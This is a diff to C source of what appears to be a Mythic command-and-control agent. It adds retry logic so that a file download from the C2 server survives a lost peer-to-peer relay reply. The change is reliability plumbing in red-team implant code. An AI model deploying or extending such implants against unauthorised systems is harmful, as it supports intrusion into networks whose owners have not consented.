@@ -218,40 +218,45 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 }
 
 /* Download a file from Mythic into a fresh buffer (the register/spawn flow).
- * On success, out_buf and out_len are set and the caller owns out_buf. */
+ * On success, out_buf and out_len are set and the caller owns out_buf.
+ * A lost relayed reply fails the round trip (see p2p_recv_timeout); retry the
+ * whole download a few times before giving up so a transient blip doesn't
+ * waste an otherwise-good task. */
 static int agent_download_file(AgentState *state, char *task_id, char *file_uuid, char **buf, size_t *buflen) {
-	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task_id, file_uuid);
-	
-	// Guard against the server failing to advance the chunk counter (no-progress loop).
-	int no_progress_count = 0;
-	int last_next_chunk = 0;
-	while (upload.finished == FALSE) {
-		BOOL result = perform_upload(state, &upload);
-		if (result == FALSE) {
-			upload.error = TRUE;
-			break;
-		}
-		if (upload.next_chunk == last_next_chunk) {
-			no_progress_count++;
-			if (no_progress_count >= 3) {
+	for (int attempt = 0; attempt < 3; attempt++) {
+		UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task_id, file_uuid);
+
+		// Guard against the server failing to advance the chunk counter (no-progress loop).
+		int no_progress_count = 0;
+		int last_next_chunk = 0;
+		while (upload.finished == FALSE) {
+			BOOL result = perform_upload(state, &upload);
+			if (result == FALSE) {
 				upload.error = TRUE;
 				break;
 			}
-		} else {
-			no_progress_count = 0;
-			last_next_chunk = upload.next_chunk;
+			if (upload.next_chunk == last_next_chunk) {
+				no_progress_count++;
+				if (no_progress_count >= 3) {
+					upload.error = TRUE;
+					break;
+				}
+			} else {
+				no_progress_count = 0;
+				last_next_chunk = upload.next_chunk;
+			}
 		}
-	}
-	
-	if (upload.error == TRUE) {
+
+		if (upload.error == FALSE) {
+			*buf = upload.current_buffer;
+			*buflen = upload.buflen;
+			upload.current_buffer = NULL; /* hand ownership to the caller */
+			free_upload_manager(&upload);
+			return 0;
+		}
 		free_upload_manager(&upload);
-		return -1;
 	}
-	*buf = upload.current_buffer;
-	*buflen = upload.buflen;
-	upload.current_buffer = NULL; /* hand ownership to the caller */
-	free_upload_manager(&upload);
-	return 0;
+	return -1;
 }
 
 void agent_register(AgentState *state, TaskInfo *task) {
